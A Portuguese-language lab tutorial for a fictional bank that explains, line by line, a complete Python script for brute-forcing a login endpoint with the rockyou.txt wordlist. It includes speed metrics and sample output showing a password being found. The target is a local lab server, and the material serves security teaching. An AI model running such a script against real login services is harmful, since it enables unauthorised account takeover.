# Guia Prático: Força Bruta com Wordlist Real (`rockyou.txt`) e Métricas

**Laboratório Prático:** NexusBank Corporate  
**Ambiente de Testes:** Python 3 + Biblioteca `requests`  
**Wordlist:** `rockyou.txt` *(ou listas com milhares de senhas)*  
**Código de Apoio:** `bruteforce_rockyou.py`  

---

## 1. O Cenário: Operações com Listas Massivas

Nos guias anteriores, utilizamos arquivos de teste com poucas linhas construídos manualmente.

Em auditorias de conformidade e testes de intrusão reais, o analista utiliza **wordlists consagradas de mercado**, como a célebre **`rockyou.txt`**, que possui mais de **14 milhões de senhas** extraídas de vazamentos históricos de grandes bases de dados.

Operar contra uma lista com essa magnitude impõe três desafios computacionais:
1. **Consumo de Memória RAM:** Carregar 14 milhões de strings para a memória simultaneamente esgota os recursos do computador e encerra o processo por falta de memória (*Out of Memory*).
2. **Incompatibilidade de Codificação (Encoding):** Arquivos legados de vazamentos contêm bytes especiais e caracteres não-padrão que causam o erro `UnicodeDecodeError` no Python moderno.
3. **Resiliência e Métricas de Rede:** Conexões longas podem oscilar. O script precisa tolerar falhas pontuais e calcular a taxa de requisições por segundo (velocidade do ataque).

---

## 2. Soluções de Engenharia Deste Script

### A. Leitura em Fluxo Contínuo (*Streaming*) Linha a Linha
Em vez de usar `.read()` ou `.readlines()`, iteramos diretamente sobre o descritor de arquivo do Python:
```python
with open("rockyou.txt", "r", encoding="latin-1", errors="ignore") as arquivo:
    for linha in arquivo:
        senha = linha.strip()
```
* O Python mantém em memória **apenas a linha que está sendo processada no instante atual**. Arquivos de vários gigabytes são lidos com consumo fixo de poucos megabytes de RAM.

### B. Codificação `latin-1` com `errors="ignore"`
A codificação padrão do Python é UTF-8. Ao encontrar um byte de vazamento inválido nessa tabela, o programa é interrompido.  
O uso de `encoding="latin-1"` associado a `errors="ignore"` garante que cada byte seja interpretado de forma segura, permitindo que a leitura prossiga do início ao fim sem interrupções.

### C. Tolerância a Falhas de Rede com `try / except`
Durante o disparo de centenas de requisições, o servidor pode reiniciar ou a rede local sofrer instabilidades.  
O encapsulamento da chamada de rede com `try / except` captura a exceção de forma controlada, evitando o encerramento abrupto com rastros de erro (*traceback*):
```python
try:
    resposta = requests.post(URL_ALVO, json=payload, timeout=5)
except requests.exceptions.RequestException as erro:
    print(f"\n[!] Falha de comunicação com o servidor: {erro}")
    break
```

### D. Métricas de Desempenho e Velocidade
Utilizando o módulo `time`, capturamos o instante exato do início da execução:
```python
tempo_inicio = time.time()
# ... execução dos testes ...
tempo_total = time.time() - tempo_inicio
velocidade = tentativas / tempo_total
```
Isso permite calcular em tempo real quantas tentativas o script consegue disparar por segundo contra a aplicação.

---

## 3. Análise Linha a Linha do Código

```python
 1 | #!/usr/bin/env python3
 2 | # -*- coding: utf-8 -*-
 3 | import os
 4 | import sys
 5 | import time
 6 | import requests
 7 | 
 8 | # ==============================================================================
 9 | # 1. CONFIGURAÇÕES DO ALVO E DO ARQUIVO
10 | # ==============================================================================
11 | URL_ALVO = "http://127.0.0.1:8002/login"
12 | USUARIO_ALVO = "ana"
13 | ARQUIVO_WORDLIST = "rockyou.txt"
14 | 
15 | # ==============================================================================
16 | # 2. VALIDAÇÃO DO AMBIENTE
17 | # ==============================================================================
18 | if not os.path.exists(ARQUIVO_WORDLIST):
19 |     print(f"[!] Arquivo de wordlist '{ARQUIVO_WORDLIST}' não foi encontrado na pasta atual.")
20 |     print("    Certifique-se de que o arquivo está na mesma pasta do script.")
21 |     sys.exit(1)
22 | 
23 | # ==============================================================================
24 | # 3. EXECUÇÃO DO ATAQUE DE DICIONÁRIO
25 | # ==============================================================================
26 | print("=" * 65)
27 | print("   INICIANDO TESTE DE FORÇA BRUTA (ATAQUE DE DICIONÁRIO)")
28 | print("=" * 65)
29 | print(f" Alvo       : {URL_ALVO}")
30 | print(f" Usuário    : {USUARIO_ALVO}")
31 | print(f" Wordlist   : {ARQUIVO_WORDLIST}")
32 | print("=" * 65)
33 | 
34 | tentativas = 0
35 | senha_encontrada = None
36 | tempo_inicio = time.time()
37 | 
38 | with open(ARQUIVO_WORDLIST, "r", encoding="latin-1", errors="ignore") as arquivo:
39 |     for linha in arquivo:
40 |         senha = linha.strip()
41 | 
42 |         if not senha:
43 |             continue
44 | 
45 |         tentativas += 1
46 | 
47 |         payload = {
48 |             "usuario": USUARIO_ALVO,
49 |             "senha": senha
50 |         }
51 | 
52 |         try:
53 |             resposta = requests.post(URL_ALVO, json=payload, timeout=5)
54 | 
55 |             if resposta.status_code == 200:
56 |                 senha_encontrada = senha
57 |                 print(f"[+] [TENTATIVA {tentativas:04d}] >>> SUCESSO! Senha correta: '{senha}' <<<")
58 |                 break
59 |             elif resposta.status_code == 401:
60 |                 print(f"[-] [TENTATIVA {tentativas:04d}] Senha: '{senha}' -> Incorreta (401)")
61 |             else:
62 |                 print(f"[?] [TENTATIVA {tentativas:04d}] Senha: '{senha}' -> Status inesperado: {resposta.status_code}")
63 | 
64 |         except requests.exceptions.RequestException as erro:
65 |             print(f"\n[!] Falha de comunicação com o servidor: {erro}")
66 |             print("[!] Verifique se o servidor do laboratório está ligado.")
67 |             break
68 | 
69 | tempo_total = time.time() - tempo_inicio
70 | 
71 | # ==============================================================================
72 | # 4. RELATÓRIO FINAL
73 | # ==============================================================================
74 | print("\n" + "=" * 65)
75 | print("   RESUMO DA EXECUÇÃO")
76 | print("=" * 65)
77 | print(f" Total de tentativas realizadas : {tentativas}")
78 | print(f" Tempo total de execução       : {tempo_total:.2f} segundos")
79 | 
80 | if tempo_total > 0:
81 |     velocidade = tentativas / tempo_total
82 |     print(f" Velocidade média               : {velocidade:.1f} requisições/segundo")
83 | 
84 | if senha_encontrada:
85 |     print(f" Resultado                      : SENHA LOCALIZADA -> '{senha_encontrada}'")
86 | else:
87 |     print(" Resultado                      : Senha não encontrada na wordlist testada.")
88 | print("=" * 65)
```

| Linhas | Código | Finalidade Técnica |
| :---: | :--- | :--- |
| `3–6` | Módulos importados | `os` e `sys` para validações do SO; `time` para métricas; `requests` para HTTP. |
| `11–13`| Parâmetros Globais | Define endereço da API, conta alvo e o arquivo da lista de senhas. |
| `18–21`| Validação Defensiva | Verifica se o arquivo existe antes de executar; encerra com código `1` caso ausente. |
| `34–36`| Inicializações | Cria contador de chutes, variável receptora da senha e salva o relógio inicial (`time.time()`). |
| `38` | `with open(..., encoding="latin-1", errors="ignore")` | Abertura segura sem travar por caracteres corrompidos. |
| `39–40`| Iteração em Streaming | Lê apenas uma linha por ciclo, removendo quebra de linha com `.strip()`. |
| `42–43`| `if not senha: continue` | Descarta linhas vazias que possam existir no arquivo. |
| `45` | `tentativas += 1` | Incrementa o contador de requisições disparadas. |
| `47–50`| `payload = {...}` | Estrutura o objeto JSON enviado no corpo da requisição. |
| `52–53`| `requests.post(..., timeout=5)` | Dispara a requisição aguardando resposta por no máximo 5 segundos. |
| `55–58`| `if resposta.status_code == 200:` | Verifica credencial válida; grava o valor e encerra o laço com `break`. |
| `59–60`| `elif resposta.status_code == 401:` | Log de credencial incorreta; segue naturalmente para a próxima iteração. |
| `64–67`| `except RequestException:` | Trata quedas de conexão de forma limpa sem quebrar a execução. |
| `69` | `tempo_total = ...` | Subtrai o tempo inicial do momento atual para apurar a duração da rotina. |
| `74–88`| Painel Consolidado | Exibe total de chutes, tempo transcorrido, requisições/segundo e a credencial achada. |

---

## 4. Código Completo: `bruteforce_rockyou.py`

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Laboratório Prático - UC11
Script: Força Bruta / Ataque de Dicionário em Endpoint de Autenticação
Alvo: NexusBank Corporate
"""

import os
import sys
import time
import requests

# ==============================================================================
# 1. CONFIGURAÇÕES DO ALVO E DO ARQUIVO
# ==============================================================================
URL_ALVO = "http://127.0.0.1:8002/login"
USUARIO_ALVO = "ana"
ARQUIVO_WORDLIST = "rockyou.txt"


# ==============================================================================
# 2. VALIDAÇÃO DO AMBIENTE
# ==============================================================================
if not os.path.exists(ARQUIVO_WORDLIST):
    print(f"[!] Arquivo de wordlist '{ARQUIVO_WORDLIST}' não foi encontrado na pasta atual.")
    print("    Certifique-se de que o arquivo está na mesma pasta do script.")
    sys.exit(1)


# ==============================================================================
# 3. EXECUÇÃO DO ATAQUE DE DICIONÁRIO
# ==============================================================================
print("=" * 65)
print("   INICIANDO TESTE DE FORÇA BRUTA (ATAQUE DE DICIONÁRIO)")
print("=" * 65)
print(f" Alvo       : {URL_ALVO}")
print(f" Usuário    : {USUARIO_ALVO}")
print(f" Wordlist   : {ARQUIVO_WORDLIST}")
print("=" * 65)

tentativas = 0
senha_encontrada = None
tempo_inicio = time.time()

with open(ARQUIVO_WORDLIST, "r", encoding="latin-1", errors="ignore") as arquivo:
    for linha in arquivo:
        senha = linha.strip()

        if not senha:
            continue

        tentativas += 1

        payload = {
            "usuario": USUARIO_ALVO,
            "senha": senha
        }

        try:
            resposta = requests.post(URL_ALVO, json=payload, timeout=5)

            if resposta.status_code == 200:
                senha_encontrada = senha
                print(f"[+] [TENTATIVA {tentativas:04d}] >>> SUCESSO! Senha correta: '{senha}' <<<")
                break
            elif resposta.status_code == 401:
                print(f"[-] [TENTATIVA {tentativas:04d}] Senha: '{senha}' -> Incorreta (401)")
            else:
                print(f"[?] [TENTATIVA {tentativas:04d}] Senha: '{senha}' -> Status inesperado: {resposta.status_code}")

        except requests.exceptions.RequestException as erro:
            print(f"\n[!] Falha de comunicação com o servidor: {erro}")
            print("[!] Verifique se o servidor do laboratório está ligado.")
            break

tempo_total = time.time() - tempo_inicio

# ==============================================================================
# 4. RELATÓRIO FINAL
# ==============================================================================
print("\n" + "=" * 65)
print("   RESUMO DA EXECUÇÃO")
print("=" * 65)
print(f" Total de tentativas realizadas : {tentativas}")
print(f" Tempo total de execução       : {tempo_total:.2f} segundos")

if tempo_total > 0:
    velocidade = tentativas / tempo_total
    print(f" Velocidade média               : {velocidade:.1f} requisições/segundo")

if senha_encontrada:
    print(f" Resultado                      : SENHA LOCALIZADA -> '{senha_encontrada}'")
else:
    print(" Resultado                      : Senha não encontrada na wordlist testada.")
print("=" * 65)
```

---

## 5. Procedimento de Execução no Terminal

1. Crie uma wordlist de teste chamada `rockyou.txt` na mesma pasta do script (caso não esteja usando o arquivo completo do laboratório):
   ```text
   111111
   password
   12345
   123456
   admin123
   ```
2. Execute o script:
   ```bash
   python bruteforce_rockyou.py
   ```
3. **Saída esperada no terminal:**
   ```text
   =================================================================
      INICIANDO TESTE DE FORÇA BRUTA (ATAQUE DE DICIONÁRIO)
   =================================================================
    Alvo       : http://127.0.0.1:8002/login
    Usuário    : ana
    Wordlist   : rockyou.txt
   =================================================================
   [-] [TENTATIVA 0001] Senha: '111111' -> Incorreta (401)
   [-] [TENTATIVA 0002] Senha: 'password' -> Incorreta (401)
   [-] [TENTATIVA 0003] Senha: '12345' -> Incorreta (401)
   [+] [TENTATIVA 0004] >>> SUCESSO! Senha correta: '123456' <<<

   =================================================================
      RESUMO DA EXECUÇÃO
   =================================================================
    Total de tentativas realizadas : 4
    Tempo total de execução       : 0.14 segundos
    Velocidade média               : 28.6 requisições/segundo
    Resultado                      : SENHA LOCALIZADA -> '123456'
   =================================================================
   ```
